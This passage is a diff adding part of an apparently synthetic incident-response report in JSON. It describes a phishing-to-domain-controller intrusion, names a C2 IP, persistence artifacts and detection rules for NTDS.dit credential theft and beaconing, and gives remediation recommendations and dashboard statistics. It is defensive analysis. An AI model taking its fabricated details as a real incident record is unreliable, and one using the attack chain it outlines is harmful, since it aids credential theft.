+      "event_count": 1,
+      "finding_ids": [
+        "F-011"
+      ],
+      "max_severity": "low"
+    }
+  ],
+  "recommendations": {
+    "immediate": [
+      {
+        "action": "Isolate WIN-WKS07 and WIN-DC01 from the network pending forensic imaging.",
+        "priority": "critical",
+        "rationale": "Both hosts show active compromise indicators; continued network access risks further lateral movement or exfiltration.",
+        "finding_ids": [
+          "F-004",
+          "F-005",
+          "F-006"
+        ],
+        "effort": "trivial"
+      },
+      {
+        "action": "Block 185.220.101.42 at the perimeter firewall and any egress proxy.",
+        "priority": "critical",
+        "rationale": "Active C2 beaconing observed for over 4 hours.",
+        "finding_ids": [
+          "F-002",
+          "F-008"
+        ],
+        "effort": "trivial"
+      },
+      {
+        "action": "Begin a phased, forest-wide privileged credential reset, prioritizing accounts with recent DC logons.",
+        "priority": "critical",
+        "rationale": "NTDS.dit was extracted; every domain credential hash should be treated as compromised.",
+        "finding_ids": [
+          "F-006"
+        ],
+        "effort": "significant"
+      }
+    ],
+    "short_term": [
+      {
+        "action": "Reset the krbtgt account password twice, 10+ hours apart.",
+        "priority": "high",
+        "rationale": "Standard remediation after suspected NTDS.dit compromise to invalidate golden-ticket forgeries.",
+        "finding_ids": [
+          "F-006"
+        ],
+        "effort": "moderate"
+      },
+      {
+        "action": "Hunt for svchostmgr.exe and the SvcHostMgr scheduled task across the remainder of the fleet.",
+        "priority": "high",
+        "rationale": "Confirms whether the intrusion is contained to the two hosts already identified.",
+        "finding_ids": [
+          "F-003",
+          "F-008"
+        ],
+        "effort": "moderate"
+      },
+      {
+        "action": "Re-enable Windows Defender real-time protection fleet-wide and alert on future policy-key changes.",
+        "priority": "medium",
+        "rationale": "The same evasion technique could be reused against other hosts.",
+        "finding_ids": [
+          "F-010"
+        ],
+        "effort": "trivial"
+      }
+    ],
+    "long_term": [
+      {
+        "action": "Deploy application allow-listing to block LNK-triggered script interpreters from user Downloads folders.",
+        "priority": "medium",
+        "rationale": "Would have blocked the initial-access technique used in this intrusion.",
+        "finding_ids": [
+          "F-001"
+        ],
+        "effort": "significant"
+      },
+      {
+        "action": "Disable or rotate all service accounts with PasswordNeverExpires set.",
+        "priority": "low",
+        "rationale": "Standing-credential hygiene reduces the value of any future credential-access success.",
+        "finding_ids": [
+          "F-012"
+        ],
+        "effort": "moderate"
+      }
+    ],
+    "further_collection": [
+      {
+        "action": "Re-run the analysis pipeline against the full, unreduced WIN-DC01 03:00-04:00 UTC window to confirm or refute F-007.",
+        "priority": "high",
+        "rationale": "F-007 could not be cited against raw evidence this pass due to token-budget reduction.",
+        "finding_ids": [
+          "F-007"
+        ],
+        "effort": "moderate"
+      },
+      {
+        "action": "Obtain \\\\FS01 file-share access logs to determine the exact contents of eng_specs.7z.",
+        "priority": "medium",
+        "rationale": "Needed to scope the data-loss exposure precisely rather than assuming the worst case.",
+        "finding_ids": [
+          "F-009"
+        ],
+        "effort": "moderate"
+      },
+      {
+        "action": "Obtain network telemetry/full packet capture for 185.220.101.42 if retained by the perimeter.",
+        "priority": "medium",
+        "rationale": "Would confirm whether the staged archive was actually exfiltrated over the C2 channel.",
+        "finding_ids": [
+          "F-008",
+          "F-009"
+        ],
+        "effort": "significant"
+      }
+    ]
+  },
+  "analytic_gaps": [
+    {
+      "gap": "Whether the staged eng_specs.7z archive was actually transferred off-host cannot be determined from host-based telemetry alone.",
+      "reason": "requires_network_telemetry",
+      "detail": "Netstat-derived connection metadata shows byte counts consistent with beaconing, not a single large transfer, but full packet capture was not part of this collection.",
+      "how_to_close": "Obtain firewall/proxy logs or full packet capture for 185.220.101.42 covering 2026-04-17 13:45-18:35 UTC."
+    },
+    {
+      "gap": "Whether any host beyond WIN-WKS07 and WIN-DC01 was reached using the jsmith credential.",
+      "reason": "evidence_truncated_by_budget",
+      "detail": "Only two hosts were included in this collection; domain-wide authentication logs were not available to this pass.",
+      "how_to_close": "Pull Security 4624/4625 events for ACME\\jsmith from every domain-joined host or the SIEM for the incident window."
+    },
+    {
+      "gap": "F-007 (scheduled task activity on WIN-DC01) could not be independently verified against raw timeline rows.",
+      "reason": "evidence_truncated_by_budget",
+      "detail": "The relevant WIN-DC01 03:00-04:00 UTC window was outside the token budget for this pass and was represented only by a detection-engine summary.",
+      "how_to_close": "Re-run analysis with that window included at full fidelity, or manually review the raw Sysmon/Security logs for that window."
+    }
+  ],
+  "dismissed_detections": [
+    {
+      "engine": "sigma",
+      "rule_id": "SIG-0099",
+      "rule_name": "PowerShell execution policy bypass",
+      "occurrences": 214,
+      "rationale": "Matches a known, approved internal deployment script (SCCM baseline) that runs on every managed workstation nightly; timing and parent process do not align with the intrusion timeline.",
+      "confidence": "high"
+    },
+    {
+      "engine": "yara",
+      "rule_id": "YAR-0004",
+      "rule_name": "Generic base64 PowerShell blob",
+      "occurrences": 39,
+      "rationale": "Fired on legitimate Exchange Online Management module output on multiple unrelated hosts; a known high-false-positive rule for this environment.",
+      "confidence": "moderate"
+    },
+    {
+      "engine": "sigma",
+      "rule_id": "SIG-1188",
+      "rule_name": "New local user created",
+      "occurrences": 3,
+      "rationale": "All three creations correspond to a documented contractor onboarding ticket (CHG-88213) with matching timestamps and approver.",
+      "confidence": "high"
+    }
+  ],
+  "dashboard": {
+    "bucket_size": "hour",
+    "events_over_time": [
+      {
+        "bucket_utc": "2026-04-17T00:00:00.0000000Z",
+        "count": 43,
+        "by_severity": {
+          "none": 40,
+          "informational": 2,
+          "low": 1,
+          "medium": 0,
+          "high": 0,
+          "critical": 0
+        }
+      },
+      {
+        "bucket_utc": "2026-04-17T01:00:00.0000000Z",
+        "count": 50,
+        "by_severity": {
+          "none": 47,
+          "informational": 2,
+          "low": 1,
+          "medium": 0,
+          "high": 0,
+          "critical": 0
+        }
+      },
+      {
+        "bucket_utc": "2026-04-17T02:00:00.0000000Z",
+        "count": 55,
+        "by_severity": {
+          "none": 52,
+          "informational": 2,
+          "low": 1,
+          "medium": 0,
+          "high": 0,
+          "critical": 0
+        }
+      },
+      {
+        "bucket_utc": "2026-04-17T03:00:00.0000000Z",
+        "count": 60,
+        "by_severity": {
+          "none": 57,
+          "informational": 2,
+          "low": 1,
+          "medium": 0,
+          "high": 0,
+          "critical": 0
+        }
+      },
+      {
+        "bucket_utc": "2026-04-17T04:00:00.0000000Z",
+        "count": 62,
+        "by_severity": {
+          "none": 59,
+          "informational": 2,
+          "low": 1,
+          "medium": 0,
+          "high": 0,
+          "critical": 0
+        }
+      },
+      {
+        "bucket_utc": "2026-04-17T05:00:00.0000000Z",
+        "count": 63,
+        "by_severity": {
+          "none": 60,
+          "informational": 2,
+          "low": 1,
+          "medium": 0,
+          "high": 0,
+          "critical": 0
+        }
+      },
+      {
+        "bucket_utc": "2026-04-17T06:00:00.0000000Z",
+        "count": 61,
+        "by_severity": {
+          "none": 58,
+          "informational": 2,
+          "low": 1,
+          "medium": 0,
+          "high": 0,
+          "critical": 0
+        }
+      },
+      {
+        "bucket_utc": "2026-04-17T07:00:00.0000000Z",
+        "count": 57,
+        "by_severity": {
+          "none": 54,
+          "informational": 2,
+          "low": 1,
+          "medium": 0,
+          "high": 0,
+          "critical": 0
+        }
+      },
+      {
+        "bucket_utc": "2026-04-17T08:00:00.0000000Z",
+        "count": 52,
+        "by_severity": {
+          "none": 49,
+          "informational": 2,
+          "low": 1,
+          "medium": 0,
+          "high": 0,
+          "critical": 0
+        }
+      },
+      {
+        "bucket_utc": "2026-04-17T09:00:00.0000000Z",
+        "count": 46,
+        "by_severity": {
+          "none": 43,
+          "informational": 2,
+          "low": 1,
+          "medium": 0,
+          "high": 0,
+          "critical": 0
+        }
+      },
+      {
+        "bucket_utc": "2026-04-17T10:00:00.0000000Z",
+        "count": 39,
+        "by_severity": {
+          "none": 36,
+          "informational": 2,
+          "low": 1,
+          "medium": 0,
+          "high": 0,
+          "critical": 0
+        }
+      },
+      {
+        "bucket_utc": "2026-04-17T11:00:00.0000000Z",
+        "count": 33,
+        "by_severity": {
+          "none": 30,
+          "informational": 2,
+          "low": 1,
+          "medium": 0,
+          "high": 0,
+          "critical": 0
+        }
+      },
+      {
+        "bucket_utc": "2026-04-17T12:00:00.0000000Z",
+        "count": 28,
+        "by_severity": {
+          "none": 25,
+          "informational": 2,
+          "low": 1,
+          "medium": 0,
+          "high": 0,
+          "critical": 0
+        }
+      },
+      {
+        "bucket_utc": "2026-04-17T13:00:00.0000000Z",
+        "count": 42,
+        "by_severity": {
+          "none": 21,
+          "informational": 6,
+          "low": 4,
+          "medium": 3,
+          "high": 6,
+          "critical": 2
+        }
+      },
+      {
+        "bucket_utc": "2026-04-17T14:00:00.0000000Z",
+        "count": 35,
+        "by_severity": {
+          "none": 20,
+          "informational": 6,
+          "low": 4,
+          "medium": 3,
+          "high": 2,
+          "critical": 0
+        }
+      },
+      {
+        "bucket_utc": "2026-04-17T15:00:00.0000000Z",
+        "count": 36,
+        "by_severity": {
+          "none": 21,
+          "informational": 6,
+          "low": 4,
+          "medium": 3,
+          "high": 2,
+          "critical": 0
+        }
+      },
+      {
+        "bucket_utc": "2026-04-17T16:00:00.0000000Z",
+        "count": 41,
+        "by_severity": {
+          "none": 24,
+          "informational": 6,
+          "low": 4,
+          "medium": 3,
+          "high": 2,
+          "critical": 2
+        }
+      },
+      {
+        "bucket_utc": "2026-04-17T17:00:00.0000000Z",
+        "count": 43,
+        "by_severity": {
+          "none": 28,
+          "informational": 6,
+          "low": 4,
+          "medium": 3,
+          "high": 2,
+          "critical": 0
+        }
+      },
+      {
+        "bucket_utc": "2026-04-17T18:00:00.0000000Z",
+        "count": 49,
+        "by_severity": {
+          "none": 34,
+          "informational": 6,
+          "low": 4,
+          "medium": 3,
+          "high": 2,
+          "critical": 0
+        }
+      },
+      {
+        "bucket_utc": "2026-04-17T19:00:00.0000000Z",
+        "count": 44,
+        "by_severity": {
+          "none": 41,
+          "informational": 2,
+          "low": 1,
+          "medium": 0,
+          "high": 0,
+          "critical": 0
+        }
+      },
+      {
+        "bucket_utc": "2026-04-17T20:00:00.0000000Z",
+        "count": 50,
+        "by_severity": {
+          "none": 47,
+          "informational": 2,
+          "low": 1,
+          "medium": 0,
+          "high": 0,
+          "critical": 0
+        }
+      },
+      {
+        "bucket_utc": "2026-04-17T21:00:00.0000000Z",
+        "count": 56,
+        "by_severity": {
+          "none": 53,
+          "informational": 2,
+          "low": 1,
+          "medium": 0,
+          "high": 0,
+          "critical": 0
+        }
+      },
+      {
+        "bucket_utc": "2026-04-17T22:00:00.0000000Z",
+        "count": 60,
+        "by_severity": {
+          "none": 57,
+          "informational": 2,
+          "low": 1,
+          "medium": 0,
+          "high": 0,
+          "critical": 0
+        }
+      },
+      {
+        "bucket_utc": "2026-04-17T23:00:00.0000000Z",
+        "count": 63,
+        "by_severity": {
+          "none": 60,
+          "informational": 2,
+          "low": 1,
+          "medium": 0,
+          "high": 0,
+          "critical": 0
+        }
+      }
+    ],
+    "severity_distribution": {
+      "none": 11800,
+      "informational": 420,
+      "low": 180,
+      "medium": 62,
+      "high": 24,
+      "critical": 6
+    },
+    "source_distribution": {
+      "wineventlog": 30500,
+      "filesystem": 8200,
+      "registry": 4100,
+      "prefetch": 1900,
+      "network": 3510
+    },
+    "top_detection_rules": [
+      {
+        "rule_name": "PowerShell execution policy bypass",
+        "engine": "sigma",
+        "count": 214,
+        "severity": "low"
+      },
+      {
+        "rule_name": "ET MALWARE Beaconing Behavior",
+        "engine": "suricata",
+        "count": 58,
+        "severity": "high"
+      },
+      {
+        "rule_name": "Generic base64 PowerShell blob",
+        "engine": "yara",
+        "count": 39,
+        "severity": "medium"
+      },
+      {
+        "rule_name": "NTDS.dit access via VSS",
+        "engine": "sigma",
+        "count": 2,
+        "severity": "critical"
+      }
+    ],
+    "top_processes": [
+      {
+        "process": "powershell.exe",
+        "count": 812
+      },
+      {
+        "process": "svchostmgr.exe",
+        "count": 214
+      },
+      {
+        "process": "schtasks.exe",
+        "count": 18
+      }
+    ],
+    "top_paths": [
+      {
+        "path": "C:\\Users\\jsmith\\AppData\\Local\\Temp",
+        "count": 340
+      },
+      {
+        "path": "C:\\Windows\\Temp",
+        "count": 88
+      }
+    ],
+    "network_endpoints": [
+      {
+        "endpoint": "185.220.101.42:443",
+        "count": 58
+      },
+      {
+        "endpoint": "10.20.4.77",
+        "count": 4
+      }
+    ],
+    "accounts_active": [
+      {
+        "account": "ACME\\jsmith",
+        "count": 940
+      },
+      {
+        "account": "ACME\\svc-backup-legacy",
+        "count": 2
+      }
+    ],
+    "hourly_heatmap": [
+      {
+        "day_of_week": 0,
+        "hour": 0,
+        "count": 8
+      },
+      {
+        "day_of_week": 0,
+        "hour": 1,
+        "count": 2
+      },
+      {
+        "day_of_week": 0,
+        "hour": 2,
+        "count": 2
+      },
+      {
+        "day_of_week": 0,
+        "hour": 3,
+        "count": 2
+      },
+      {
+        "day_of_week": 0,
+        "hour": 4,
+        "count": 2
+      },
+      {
+        "day_of_week": 0,
+        "hour": 5,
+        "count": 8
+      },
+      {
+        "day_of_week": 0,
+        "hour": 6,
+        "count": 8
+      },
+      {
+        "day_of_week": 0,
+        "hour": 7,
+        "count": 8
+      },
+      {
+        "day_of_week": 0,
+        "hour": 8,
+        "count": 8
+      },
+      {
+        "day_of_week": 0,
+        "hour": 9,
+        "count": 8
+      },
+      {
+        "day_of_week": 0,
+        "hour": 10,
+        "count": 8
+      },
+      {
+        "day_of_week": 0,
+        "hour": 11,
+        "count": 8
+      },
+      {
+        "day_of_week": 0,
+        "hour": 12,
+        "count": 8
+      },
+      {
+        "day_of_week": 0,
+        "hour": 13,
+        "count": 8
+      },
+      {
+        "day_of_week": 0,
+        "hour": 14,
+        "count": 8
+      },
+      {
+        "day_of_week": 0,
+        "hour": 15,
+        "count": 8
+      },
+      {
+        "day_of_week": 0,
+        "hour": 16,
+        "count": 8
+      },
+      {
+        "day_of_week": 0,
+        "hour": 17,
+        "count": 8
+      },
+      {
+        "day_of_week": 0,
+        "hour": 18,
+        "count": 8
+      },
+      {
+        "day_of_week": 0,
+        "hour": 19,
+        "count": 8
+      },
+      {
+        "day_of_week": 0,
+        "hour": 20,
+        "count": 8
+      },
+      {
+        "day_of_week": 0,
+        "hour": 21,
+        "count": 8
+      },
+      {
+        "day_of_week": 0,
+        "hour": 22,
+        "count": 8
+      },
+      {
+        "day_of_week": 0,
+        "hour": 23,
+        "count": 8
+      },
+      {
+        "day_of_week": 1,
+        "hour": 0,
+        "count": 8
+      },
+      {
+        "day_of_week": 1,
+        "hour": 1,
+        "count": 2
+      },
+      {
+        "day_of_week": 1,
+        "hour": 2,
+        "count": 2
+      },
+      {
+        "day_of_week": 1,
+        "hour": 3,
+        "count": 2
+      },
+      {
+        "day_of_week": 1,
+        "hour": 4,
+        "count": 2
+      },
+      {
+        "day_of_week": 1,
+        "hour": 5,
+        "count": 8
+      },
+      {
+        "day_of_week": 1,
+        "hour": 6,
+        "count": 8
+      },
+      {
+        "day_of_week": 1,
+        "hour": 7,
+        "count": 8
+      },
+      {
+        "day_of_week": 1,
+        "hour": 8,
+        "count": 8
+      },
+      {
+        "day_of_week": 1,
+        "hour": 9,
+        "count": 8
+      },
+      {
+        "day_of_week": 1,
+        "hour": 10,
+        "count": 8
+      },
+      {
+        "day_of_week": 1,
+        "hour": 11,
+        "count": 8
+      },
+      {
+        "day_of_week": 1,
+        "hour": 12,
+        "count": 8
+      },
+      {
+        "day_of_week": 1,
+        "hour": 13,
+        "count": 8
+      },
+      {
+        "day_of_week": 1,
+        "hour": 14,
+        "count": 8
+      },
+      {
+        "day_of_week": 1,
+        "hour": 15,
+        "count": 8
+      },
+      {
+        "day_of_week": 1,
+        "hour": 16,
+        "count": 8
+      },
+      {
+        "day_of_week": 1,
+        "hour": 17,
+        "count": 8
+      },
+      {
+        "day_of_week": 1,
+        "hour": 18,
+        "count": 8
+      },
+      {
+        "day_of_week": 1,
+        "hour": 19,
+        "count": 8
+      },
+      {
+        "day_of_week": 1,
+        "hour": 20,
+        "count": 8
+      },
+      {
+        "day_of_week": 1,
+        "hour": 21,
+        "count": 8
+      },
+      {
+        "day_of_week": 1,
+        "hour": 22,
+        "count": 8
+      },
+      {
+        "day_of_week": 1,
+        "hour": 23,
+        "count": 8
+      },
+      {
+        "day_of_week": 2,
+        "hour": 0,
+        "count": 8
+      },
+      {
+        "day_of_week": 2,
+        "hour": 1,
+        "count": 2
+      },
+      {
+        "day_of_week": 2,
+        "hour": 2,
+        "count": 2
+      },
+      {
+        "day_of_week": 2,
+        "hour": 3,
+        "count": 2
+      },
+      {
+        "day_of_week": 2,
+        "hour": 4,
+        "count": 2
+      },
+      {
+        "day_of_week": 2,
+        "hour": 5,
+        "count": 8
+      },
+      {
+        "day_of_week": 2,
+        "hour": 6,
+        "count": 8
+      },
+      {
+        "day_of_week": 2,
+        "hour": 7,
+        "count": 8
+      },
+      {
+        "day_of_week": 2,
+        "hour": 8,
+        "count": 8
+      },
+      {
+        "day_of_week": 2,
+        "hour": 9,
+        "count": 8
+      },
+      {
+        "day_of_week": 2,
+        "hour": 10,
+        "count": 8
+      },
+      {
+        "day_of_week": 2,
+        "hour": 11,
+        "count": 8
+      },
+      {
+        "day_of_week": 2,
+        "hour": 12,
+        "count": 8
+      },
+      {
+        "day_of_week": 2,
+        "hour": 13,
+        "count": 8
+      },
+      {
+        "day_of_week": 2,
+        "hour": 14,
+        "count": 8
+      },
+      {
+        "day_of_week": 2,
+        "hour": 15,
+        "count": 8
+      },
+      {
+        "day_of_week": 2,
+        "hour": 16,
+        "count": 8
+      },
+      {
+        "day_of_week": 2,
+        "hour": 17,
+        "count": 8
+      },
+      {
+        "day_of_week": 2,
+        "hour": 18,
+        "count": 8
+      },
+      {
+        "day_of_week": 2,
+        "hour": 19,
+        "count": 8
+      },
+      {
+        "day_of_week": 2,
+        "hour": 20,
+        "count": 8
+      },
+      {
+        "day_of_week": 2,
+        "hour": 21,
+        "count": 8
+      },
+      {
+        "day_of_week": 2,
+        "hour": 22,
+        "count": 8
+      },
+      {
+        "day_of_week": 2,
+        "hour": 23,
+        "count": 8
+      },
+      {
+        "day_of_week": 3,
+        "hour": 0,
+        "count": 8
+      },
+      {
+        "day_of_week": 3,
+        "hour": 1,
+        "count": 2
+      },
+      {
+        "day_of_week": 3,
+        "hour": 2,
+        "count": 2
+      },
+      {
+        "day_of_week": 3,
+        "hour": 3,
+        "count": 2
+      },
+      {
+        "day_of_week": 3,
+        "hour": 4,
+        "count": 2
+      },
+      {
+        "day_of_week": 3,
+        "hour": 5,
+        "count": 8
+      },
+      {
+        "day_of_week": 3,
+        "hour": 6,
+        "count": 8
+      },
+      {
+        "day_of_week": 3,
+        "hour": 7,
+        "count": 8
+      },
+      {
+        "day_of_week": 3,
+        "hour": 8,
+        "count": 8
+      },
+      {
+        "day_of_week": 3,
+        "hour": 9,
+        "count": 8
+      },
+      {
+        "day_of_week": 3,
+        "hour": 10,
+        "count": 8
+      },
+      {
+        "day_of_week": 3,
+        "hour": 11,
+        "count": 8
+      },
+      {
+        "day_of_week": 3,
+        "hour": 12,
+        "count": 8
+      },
+      {
+        "day_of_week": 3,
+        "hour": 13,
+        "count": 8
+      },
+      {
+        "day_of_week": 3,
+        "hour": 14,
+        "count": 8
+      },
+      {
+        "day_of_week": 3,
+        "hour": 15,
+        "count": 8
+      },
+      {
+        "day_of_week": 3,
+        "hour": 16,
+        "count": 8
+      },
+      {
+        "day_of_week": 3,
+        "hour": 17,
+        "count": 8
+      },
+      {
+        "day_of_week": 3,
+        "hour": 18,
+        "count": 8
+      },
+      {
+        "day_of_week": 3,
+        "hour": 19,
+        "count": 8
+      },
+      {
+        "day_of_week": 3,
+        "hour": 20,
+        "count": 8
+      },
+      {
+        "day_of_week": 3,
+        "hour": 21,
+        "count": 8
+      },
+      {
+        "day_of_week": 3,
+        "hour": 22,
+        "count": 8
+      },
+      {
+        "day_of_week": 3,
+        "hour": 23,
+        "count": 8
+      },
+      {
+        "day_of_week": 4,
+        "hour": 0,
+        "count": 8
+      },
+      {
+        "day_of_week": 4,
+        "hour": 1,
+        "count": 2
+      },
+      {
+        "day_of_week": 4,
+        "hour": 2,
+        "count": 2
+      },
+      {
+        "day_of_week": 4,
+        "hour": 3,
+        "count": 2
+      },
+      {
+        "day_of_week": 4,
+        "hour": 4,
+        "count": 2
+      },
+      {
+        "day_of_week": 4,
+        "hour": 5,
+        "count": 8
+      },
+      {
+        "day_of_week": 4,
+        "hour": 6,
+        "count": 8
+      },
+      {
+        "day_of_week": 4,
+        "hour": 7,
+        "count": 8
+      },
+      {
+        "day_of_week": 4,
+        "hour": 8,
+        "count": 8
+      },
+      {
+        "day_of_week": 4,
+        "hour": 9,
+        "count": 8
+      },
+      {
+        "day_of_week": 4,
+        "hour": 10,
+        "count": 8
+      },
+      {
+        "day_of_week": 4,
+        "hour": 11,
+        "count": 8
+      },
+      {
+        "day_of_week": 4,
+        "hour": 12,
+        "count": 8
+      },
+      {
+        "day_of_week": 4,
+        "hour": 13,
+        "count": 8
+      },
+      {
+        "day_of_week": 4,
+        "hour": 14,
+        "count": 8
+      },
+      {
+        "day_of_week": 4,
+        "hour": 15,
+        "count": 8
+      },
+      {
+        "day_of_week": 4,
+        "hour": 16,
+        "count": 8
+      },
+      {
+        "day_of_week": 4,
+        "hour": 17,
+        "count": 8
+      },
+      {
+        "day_of_week": 4,
+        "hour": 18,
+        "count": 8
+      },
+      {
+        "day_of_week": 4,
+        "hour": 19,
+        "count": 8
+      },
+      {
+        "day_of_week": 4,
+        "hour": 20,
+        "count": 8
+      },
+      {
+        "day_of_week": 4,
+        "hour": 21,
+        "count": 8
+      },
+      {
+        "day_of_week": 4,
+        "hour": 22,
+        "count": 8
+      },
+      {
+        "day_of_week": 4,
+        "hour": 23,
+        "count": 8
+      },
+      {
+        "day_of_week": 5,
+        "hour": 0,
+        "count": 8
+      },
+      {
+        "day_of_week": 5,
+        "hour": 1,
+        "count": 2
+      },
+      {
+        "day_of_week": 5,
+        "hour": 2,
+        "count": 2
+      },
+      {
+        "day_of_week": 5,
+        "hour": 3,
+        "count": 2
+      },
+      {
+        "day_of_week": 5,
+        "hour": 4,
+        "count": 2
+      },
+      {
+        "day_of_week": 5,
+        "hour": 5,
+        "count": 8
+      },
+      {
+        "day_of_week": 5,
+        "hour": 6,
+        "count": 8
+      },
+      {
+        "day_of_week": 5,
+        "hour": 7,
+        "count": 8
+      },
+      {
+        "day_of_week": 5,
+        "hour": 8,
+        "count": 8
+      },
+      {
+        "day_of_week": 5,
+        "hour": 9,
+        "count": 8
+      },
+      {
+        "day_of_week": 5,
+        "hour": 10,
+        "count": 8
+      },
+      {
+        "day_of_week": 5,
+        "hour": 11,
+        "count": 8
+      },
+      {
+        "day_of_week": 5,
+        "hour": 12,
+        "count": 8
+      },
+      {
+        "day_of_week": 5,
+        "hour": 13,
+        "count": 43
+      },
+      {
+        "day_of_week": 5,
+        "hour": 14,
+        "count": 44
+      },
+      {
+        "day_of_week": 5,
+        "hour": 15,
+        "count": 45
+      },
+      {
+        "day_of_week": 5,
+        "hour": 16,
+        "count": 46
+      },
+      {
+        "day_of_week": 5,
+        "hour": 17,
+        "count": 47
+      },
+      {
+        "day_of_week": 5,
+        "hour": 18,
+        "count": 48
+      },
+      {
+        "day_of_week": 5,
+        "hour": 19,
+        "count": 8
+      },
+      {
+        "day_of_week": 5,
+        "hour": 20,
+        "count": 8
+      },
+      {
+        "day_of_week": 5,
+        "hour": 21,
+        "count": 8
+      },
+      {
+        "day_of_week": 5,
+        "hour": 22,
+        "count": 8
+      },
+      {
+        "day_of_week": 5,
+        "hour": 23,
+        "count": 8
+      },
+      {
+        "day_of_week": 6,
+        "hour": 0,
+        "count": 8
+      },
+      {
+        "day_of_week": 6,
+        "hour": 1,
+        "count": 2
+      },
+      {
+        "day_of_week": 6,
+        "hour": 2,
+        "count": 2
+      },
+      {
+        "day_of_week": 6,
+        "hour": 3,
+        "count": 2
+      },
+      {
+        "day_of_week": 6,
+        "hour": 4,
+        "count": 2
+      },
+      {
+        "day_of_week": 6,
+        "hour": 5,
+        "count": 8
+      },
+      {
+        "day_of_week": 6,
+        "hour": 6,
+        "count": 8
+      },
+      {
+        "day_of_week": 6,
+        "hour": 7,
+        "count": 8
+      },
+      {
+        "day_of_week": 6,
+        "hour": 8,
+        "count": 8
+      },
+      {
+        "day_of_week": 6,
+        "hour": 9,
+        "count": 8
+      },
+      {
+        "day_of_week": 6,
+        "hour": 10,
+        "count": 8
+      },
+      {
+        "day_of_week": 6,
+        "hour": 11,
+        "count": 8
+      },
+      {
+        "day_of_week": 6,
+        "hour": 12,
+        "count": 8
+      },
+      {
+        "day_of_week": 6,
+        "hour": 13,
+        "count": 8
+      },
+      {
+        "day_of_week": 6,
+        "hour": 14,
+        "count": 8
+      },
+      {
+        "day_of_week": 6,
+        "hour": 15,
+        "count": 8
+      },
+      {
+        "day_of_week": 6,
+        "hour": 16,
+        "count": 8
+      },
+      {
+        "day_of_week": 6,
+        "hour": 17,
+        "count": 8
+      },
+      {
+        "day_of_week": 6,
+        "hour": 18,
+        "count": 8
+      },
+      {
+        "day_of_week": 6,
+        "hour": 19,
+        "count": 8
+      },
+      {
+        "day_of_week": 6,
+        "hour": 20,
+        "count": 8
+      },
+      {
+        "day_of_week": 6,
+        "hour": 21,
+        "count": 8
+      },
+      {
+        "day_of_week": 6,
+        "hour": 22,
+        "count": 8
+      },
+      {
+        "day_of_week": 6,
+        "hour": 23,
+        "count": 8
+      }
+    ],
+    "entity_graph": {
+      "nodes": [
+        {
+          "id": "host:WIN-WKS07",
+          "label": "WIN-WKS07",
+          "kind": "host",
+          "severity": "critical",
+          "event_count": 30210
+        },
+        {
+          "id": "host:WIN-DC01",
+          "label": "WIN-DC01",
+          "kind": "host",
+          "severity": "critical",
+          "event_count": 18000
+        },
+        {
+          "id": "account:jsmith",
+          "label": "ACME\\jsmith",
+          "kind": "account",
+          "severity": "critical",
+          "event_count": 940
+        },
+        {
+          "id": "account:svc-backup-legacy",
+          "label": "svc-backup-legacy",
+          "kind": "account",
+          "severity": "informational",
+          "event_count": 2
+        },
+        {
+          "id": "process:powershell",
+          "label": "powershell.exe",
+          "kind": "process",
+          "severity": "high",
+          "event_count": 812
+        },
+        {
+          "id": "process:svchostmgr",
+          "label": "svchostmgr.exe",
+          "kind": "process",
+          "severity": "critical",
+          "event_count": 214
+        },
+        {
+          "id": "process:schtasks",
+          "label": "schtasks.exe",
+          "kind": "process",
+          "severity": "medium",
+          "event_count": 18
+        },
+        {
+          "id": "process:vssadmin",
+          "label": "vssadmin.exe",
+          "kind": "process",
+          "severity": "critical",
+          "event_count": 1
+        },
+        {
+          "id": "file:lnk",
+          "label": "Invoice_0417.pdf.lnk",
+          "kind": "file",
+          "severity": "high",
+          "event_count": 1
+        },
+        {
+          "id": "file:svchostmgr",
+          "label": "svchostmgr.exe (file)",
+          "kind": "file",
+          "severity": "critical",
+          "event_count": 4
+        },
+        {
+          "id": "file:ntds",
+          "label": "ntds.dit copy",
+          "kind": "file",
+          "severity": "critical",
+          "event_count": 1
+        },
+        {
+          "id": "file:archive",
+          "label": "eng_specs.7z",
+          "kind": "file",
+          "severity": "high",
+          "event_count": 1
+        },
+        {
+          "id": "ip:c2",
+          "label": "185.220.101.42",
+          "kind": "ip",
+          "severity": "critical",
+          "event_count": 58
+        },
+        {
+          "id": "ip:internal-src",
+          "label": "10.20.4.77",
+          "kind": "ip",
+          "severity": "medium",
+          "event_count": 4
+        },
+        {
+          "id": "domain:phish",
+          "label": "acme-invoice-portal.example",
+          "kind": "domain",
+          "severity": "medium",
+          "event_count": 1
+        },
+        {
+          "id": "registry:defender",
+          "label": "DisableRealtimeMonitoring",
+          "kind": "registry",
+          "severity": "medium",
+          "event_count": 1
+        },
+        {
+          "id": "task:svchostmgr",
+          "label": "SvcHostMgr",
+          "kind": "task",
+          "severity": "medium",
+          "event_count": 1
+        },
+        {
+          "id": "service:none",
+          "label": "(no services implicated)",
+          "kind": "service",
+          "severity": "informational",
+          "event_count": 0
+        }
+      ],
+      "edges": [
+        {
+          "source": "account:jsmith",
+          "target": "host:WIN-WKS07",
+          "kind": "logon",
+          "weight": 5
+        },
+        {
+          "source": "account:jsmith",
+          "target": "host:WIN-DC01",
+          "kind": "logon",
+          "weight": 1
+        },
+        {
+          "source": "file:lnk",
+          "target": "process:powershell",
+          "kind": "spawned",
+          "weight": 1
+        },
+        {
+          "source": "process:powershell",
+          "target": "file:svchostmgr",
+          "kind": "wrote",
+          "weight": 1
+        },
+        {
+          "source": "process:svchostmgr",
+          "target": "task:svchostmgr",
+          "kind": "created",
+          "weight": 1
+        },
+        {
+          "source": "process:svchostmgr",
+          "target": "ip:c2",
+          "kind": "connected",
+          "weight": 58
+        },
+        {
+          "source": "process:svchostmgr",
+          "target": "registry:defender",
+          "kind": "modified",
+          "weight": 1
+        },
+        {
+          "source": "process:vssadmin",
+          "target": "file:ntds",
+          "kind": "created",
+          "weight": 1
+        },
+        {
+          "source": "host:WIN-DC01",
+          "target": "file:ntds",
+          "kind": "hosted",
+          "weight": 1
+        },
+        {
+          "source": "account:jsmith",
+          "target": "ip:internal-src",
+          "kind": "source_ip",
+          "weight": 1
+        },
+        {
+          "source": "process:powershell",
+          "target": "domain:phish",
+          "kind": "resolved",
+          "weight": 1
+        },
+        {
+          "source": "host:WIN-WKS07",
+          "target": "file:archive",
+          "kind": "created",
+          "weight": 1
+        },
+        {
+          "source": "account:jsmith",
+          "target": "file:archive",
+          "kind": "created",
+          "weight": 1
+        },
+        {
+          "source": "process:schtasks",
+          "target": "task:svchostmgr",
+          "kind": "created",
+          "weight": 1
+        }
+      ]
+    }
+  },
+  "provenance": {
